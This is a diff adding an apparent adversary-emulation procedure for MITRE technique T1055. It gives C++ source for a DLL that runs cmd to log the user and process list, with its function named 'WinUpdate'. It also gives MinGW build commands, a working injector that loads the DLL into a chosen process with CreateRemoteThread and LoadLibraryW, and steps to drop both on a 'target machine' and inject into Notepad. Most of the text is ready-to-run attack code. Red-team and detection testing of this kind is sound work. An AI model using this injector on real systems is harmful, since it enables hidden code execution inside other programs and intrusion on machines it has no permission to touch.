@@ -1,0 +1,55 @@
+1. DLL INJECTION
+
+1.1 create DLL file in C++ executing tasklist
+nano T1055.cpp
+#include <windows.h>
+int WinUpdate()
+{
+	WinExec("cmd /c date /t >> C:\\Users\\Public\\T1055.txt & time /t >> C:\\Users\\Public\\T1055.txt & whoami >> C:\\Users\\Public\\T1055.txt & tasklist /v >> C:\\Users\\Public\\T1055.txt", 0);
+	return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwREason, LPVOID lpvReserved)
+{
+	WinUpdate();
+	return 0;
+}
+
+1.2 Compile into 64b version: T1055.dll
+x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL T1055.cpp
+x86_64-w64-mingw32-g++ -shared -o T1055.dll T1055.o -Wl,--out-implib,T1055.a
+
+
+Note:
+The -DBUILDING_EXAMPLE_DLL compiler option causes the DLL's functions to be declared as "dllexport", meaning that they will be "exported" from the DLL and available to client applications. The "-shared" option tells the linker to create a DLL instead of an .exe, and the "--out-implib" linker option causes an import library to be created, which is used later on.
+
+
+1.4 Download DLL to C:\Users\Public folder on target machine
+
+2. Create binary doing DLL injection: T1055-dll_inj.cpp:
+
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	HANDLE processHandle;
+	PVOID remoteBuffer;
+	wchar_t dllPath[] = L"C:\\Users\\Public\\T1055.dll";
+	
+	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
+	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CloseHandle(processHandle); 
+	
+	return 0;
+}
+
+2.1 compile with MinGW
+x86_64-w64-mingw32-gcc T1055-dll_inj.cpp -o T1055-dll_inj.exe
+
+2.2 Download T1055-dll_inj.exe to target machine
+
+3. Open Notepad, check PID and run T1055-dll_inj.exe with PID as argument
